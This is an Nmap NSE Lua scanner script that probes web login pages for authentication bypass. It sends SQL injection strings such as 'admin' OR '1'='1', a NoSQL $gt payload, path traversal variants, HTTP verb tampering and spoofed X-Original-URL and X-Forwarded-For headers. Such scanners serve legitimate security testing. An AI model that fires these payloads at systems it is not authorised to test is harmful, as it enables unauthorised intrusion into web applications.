-- Authentication Bypass Detection
-- Tests for common authentication bypass vulnerabilities
-- @output
-- 443/tcp open  https
-- | http-auth-bypass:
-- |   Potential Authentication Bypass:
-- |     SQL Injection in login form (admin' OR '1'='1)
-- |     Path traversal to admin panel (/admin/../admin)
-- |_    HTTP verb tampering (POST changed to GET)

description = [[
Tests for common authentication bypass techniques:
- SQL injection in login forms
- NoSQL injection
- Path traversal
- HTTP verb tampering
- Header injection
- Session fixation
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"intrusive", "auth"}

portrule = function(host, port)
    return port.service == "http" or port.service == "https" or
           port.number == 80 or port.number == 443 or port.number == 8080
end

action = function(host, port)
    local http = require "http"
    
    local vulnerabilities = {}
    
    -- Find login pages
    local login_paths = {"/login", "/admin/login", "/user/login", "/auth", "/signin"}
    local login_found = false
    local login_path = nil
    
    for _, path in ipairs(login_paths) do
        local response = http.get(host, port, path)
        if response and response.status == 200 and response.body then
            if response.body:lower():find("password") or 
               response.body:lower():find("login") or
               response.body:lower():find("username") then
                login_found = true
                login_path = path
                break
            end
        end
    end
    
    if not login_found then
        return "No login forms detected"
    end
    
    -- Test 1: SQL Injection bypass
    local sql_payloads = {
        "admin' OR '1'='1",
        "admin' OR '1'='1'--",
        "admin' OR 1=1--",
        "' OR 1=1--",
        "admin'--",
        "' OR 'a'='a",
    }
    
    for _, payload in ipairs(sql_payloads) do
        local post_data = "username=" .. http.escape(payload) .. "&password=anything"
        local response = http.post(host, port, login_path, nil, nil, post_data)
        
        if response and response.status then
            -- Check for successful login indicators
            if response.status == 302 or response.status == 301 then
                if response.header and response.header.location then
                    if not response.header.location:find("login") and 
                       not response.header.location:find("error") then
                        table.insert(vulnerabilities, 
                            "SQL Injection bypass successful: " .. payload)
                        break
                    end
                end
            elseif response.status == 200 and response.body then
                if response.body:find("dashboard") or 
                   response.body:find("Welcome") or
                   response.body:find("logout") then
                    table.insert(vulnerabilities, 
                        "SQL Injection bypass successful: " .. payload)
                    break
                end
            end
        end
    end
    
    -- Test 2: NoSQL Injection
    local nosql_payload = '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
    local response = http.post(host, port, login_path, 
        {["Content-Type"] = "application/json"}, 
        nil, nosql_payload)
    
    if response and response.status and response.status ~= 401 and response.status ~= 403 then
        if response.status == 200 or response.status == 302 then
            table.insert(vulnerabilities, "NoSQL injection bypass possible")
        end
    end
    
    -- Test 3: HTTP Verb Tampering
    -- Try accessing protected resource with different HTTP verbs
    local admin_paths = {"/admin", "/admin/", "/admin/dashboard"}
    for _, path in ipairs(admin_paths) do
        -- Try HEAD instead of GET
        local head_response = http.head(host, port, path)
        local get_response = http.get(host, port, path)
        
        if head_response and get_response then
            if head_response.status == 200 and get_response.status == 403 then
                table.insert(vulnerabilities, 
                    "HTTP verb tampering: " .. path .. " accessible via HEAD")
            end
        end
    end
    
    -- Test 4: Path Traversal in authentication
    local traversal_paths = {
        "/admin/../admin",
        "/admin/./",
        "/admin%2f",
        "//admin",
        "/admin//",
    }
    
    for _, path in ipairs(traversal_paths) do
        local response = http.get(host, port, path)
        if response and response.status == 200 then
            if response.body and not response.body:find("login") then
                table.insert(vulnerabilities, 
                    "Path traversal bypass: " .. path)
                break
            end
        end
    end
    
    -- Test 5: Header injection
    local header_tests = {
        {name = "X-Original-URL", value = "/admin"},
        {name = "X-Rewrite-URL", value = "/admin"},
        {name = "X-Forwarded-For", value = "127.0.0.1"},
        {name = "X-Remote-Addr", value = "127.0.0.1"},
    }
    
    for _, header_test in ipairs(header_tests) do
        local options = {
            header = {
                [header_test.name] = header_test.value
            }
        }
        local response = http.get(host, port, "/", options)
        if response and response.status == 200 then
            if response.body and (response.body:find("admin") or response.body:find("dashboard")) then
                table.insert(vulnerabilities, 
                    "Header injection bypass: " .. header_test.name)
            end
        end
    end
    
    if #vulnerabilities > 0 then
        local result = "Potential Authentication Bypass:\n"
        for _, vuln in ipairs(vulnerabilities) do
            result = result .. "  " .. vuln .. "\n"
        end
        return result
    end
    
    return "No authentication bypass vulnerabilities detected"
end
